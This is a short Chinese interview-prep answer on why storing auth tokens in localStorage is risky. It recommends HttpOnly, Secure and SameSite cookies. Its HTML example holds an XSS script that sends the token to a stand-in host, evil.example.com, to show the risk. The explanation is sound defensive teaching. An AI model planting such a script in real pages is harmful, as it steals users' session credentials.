---
title: [BAS-167] localStorage 存 token 有什么安全风险？
date: 2026-11-17
categories: [前端基础速答]
tags: [前端面试, 面试题, 10]
type: 面试题
---

## BAS-167：localStorage 存 token 有什么安全风险？
**答**：
- localStorage 完全开放给同源 JS：页面只要存在任意 XSS 注入点，token 就能被读走外传。
- 对比之下 HttpOnly cookie 的会话凭证 XSS 读不到——所以"localStorage 比 cookie 安全"是个常见误区。
- 实践：敏感凭证优先 HttpOnly + Secure + SameSite 的 cookie；localStorage 只放非敏感数据，同时把 XSS 防住才是根本。

```html
<!-- 页面存在任意一个 XSS 注入点，localStorage 里的内容全部可读 -->
<script>
  fetch('https://evil.example.com/collect?t=' + localStorage.getItem('token'));
</script>
<!-- 对比：HttpOnly 的 cookie 同样的 XSS 读不到 -->
<!-- 结论：凭证放 HttpOnly cookie，localStorage 放主题、草稿等非敏感数据 -->
```
